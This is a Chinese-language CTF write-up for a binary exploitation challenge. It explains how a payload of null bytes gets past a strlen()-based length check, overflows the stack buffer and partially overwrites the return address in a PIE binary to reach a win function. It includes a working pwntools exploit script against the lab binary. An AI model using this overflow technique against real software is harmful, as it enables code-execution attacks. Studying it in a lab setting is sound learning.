# 挑战简介
```
溢出缓冲区并粉碎堆栈以获取标志，但这次是在位置无关 （PIE） 二进制文件中，并对您的输入进行额外检查。
```
这题的提示表面上并没有很多,至于题目的意思,我简述一遍
```
这题建立的基础依旧包括上一题的PIEs,但是这次多了一个检查函数:如果你的输入大于某个值,直接结束进程
```

# 思路
是不是感觉很难,确实很难,我不断的尝试各种可能可依旧没有找到绕过方式
所以我通过IDA检查了challenge函数的具体机制我发现
- 输入的缓冲区由*buf指针圈住,结合char数组来获取输入
- 其中有一个变量v10,利用strlen()函数来获取*buf的大小,再进行判断
所以,**直接栈溢出是行不通的**

那么我们还可以从哪里入手?  
**man strlen**  
**仔细看,仔细看,仔细看!**  
你会发现如下一段话  
```
The strlen() function calculates the length of the string pointed to by s, excluding the terminating null byte ('\0').
```
**也就是说,strlen会计算变量字符串的大小,但是不包括\0**  
这下看懂了  
答案如下  
```
#!/usr/bin/python
from pwn import *
import struct

context(os='linux',arch='AMD64',log_level='debug')
p = process('/challenge/binary-exploitation-null-write-w')

p.recvuntil('Send your payload (up to 4096 bytes)!\n')
win_authed_address = p64(0x1cde)
#offset_last = 
payload = b"\x00" * 0x78 + b'\xde\x1c'  #没想到,\0也能用来栈溢出
print(len(payload))
p.send(payload)
p.recvall()
```
